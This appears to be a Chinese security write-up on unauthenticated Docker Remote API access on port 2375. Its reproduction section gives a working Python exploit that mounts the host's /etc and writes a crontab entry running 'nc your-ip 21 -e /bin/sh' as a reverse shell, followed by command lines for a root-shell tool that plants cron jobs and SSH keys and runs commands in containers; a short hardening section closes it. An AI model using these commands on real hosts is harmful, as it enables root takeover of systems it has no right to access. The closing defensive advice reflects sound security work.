Docker 未授权访问
=================

一、漏洞简介
------------

#### 1. 基础介绍

http://www.loner.fm/drops/\#\#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8

docker swarm 是一个将docker集群变成单一虚拟的docker
host工具，使用标准的Docker
API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。

漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker
节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page
not found ，然后他研究了下，发现这是 Docker Remote
API，可以执行docker命令，比如访问 http://host:2375/containers/json
会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps
的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。

然后我想了想
swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。

#### 2. 测试环境配置

先关闭docker，然后开启：

    sudo service docker stop
    # 绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。
    sudo docker daemon  -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock

参考API规范进行渗透：https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/

操作Docker API可以使用python dockert api 完成。

pip install docker-py

API使用参考：https://docker-py.readthedocs.io/en/stable/api/\#\#client-api

二、影响范围
------------

三、复现过程
------------

利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。

    import docker

    client = docker.DockerClient(base_url='http://your-ip:2375/')
    data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})

写入crontab文件，成功反弹shell：![](./resource/Docker未授权访问/media/rId26.png)

#### python脚本

https://github.com/ianxtianxt/docker\_api\_vul

-   安装类库    `pip install -r requirements.txt`

-   查看运行的容器    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375`

-   查看所有的容器    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a`

-   查看所有镜像    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l`

-   查看端口映射    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L`

-   写计划任务（centos,redhat等,加-u参数用于ubuntu等）    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口`    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口`

-   写sshkey(自行修改脚本的中公钥)    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k`

-   在容器中执行命令    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e  "id" -I 容器id`

-   删除容器    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id`

-   修改client api版本    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22`

-   查看服务端api版本    `python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V`

#### 3.3 其他的一些exp

https://github.com/netxfly/docker-remote-api-exphttps://github.com/zer0yu/SomePoC/blob/master/Docker/Docker\_Remote\_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.pyhttps://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8

#### 4. 防护策略

-   1.修改 Docker Remote API 服务默认参数。注意：该操作需要重启 Docker
    服务才能生效。

-   2.修改 Docker 的启动参数：    定位到 DOCKER\_OPTS 中的
    tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1    或将默认端口 2375 改为自定义端口    为 Remote API 设置认证措施。参照 官方文档 配置 Rem

-   3.注意：该操作需要重启 Docker 服务才能生效。    修改 Docker 服务运行账号。请以较低权限账号运行 Docker
    服务；另外，可以限制攻击者执行高危命令。

-   4.注意：该操作需要重启 Docker 服务才能生效。    设置防火墙策略。如果正常业务中 API
    服务需要被其他服务器来访问，可以配置安全组策略或 iptables
    策略，仅允许指定的 IP 来访问 Docker 接口。
